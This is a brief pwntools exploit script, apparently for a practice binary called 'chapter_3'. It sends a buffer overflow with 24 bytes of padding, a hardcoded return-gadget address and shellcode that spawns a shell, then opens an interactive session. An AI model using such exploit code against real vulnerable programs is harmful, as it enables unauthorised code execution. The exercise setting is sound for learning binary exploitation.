from pwn import *

r = process("./chapter_3")
context.binary = './chapter_3'
context.terminal = '/usr/bin/sh'

# gdb.attach(r)

gadget = 0x0000000000401126

payload = ("A"*16+"B"*8).encode()
payload += p64(gadget)
payload += asm(shellcraft.sh())

r.sendline(payload)
r.interactive()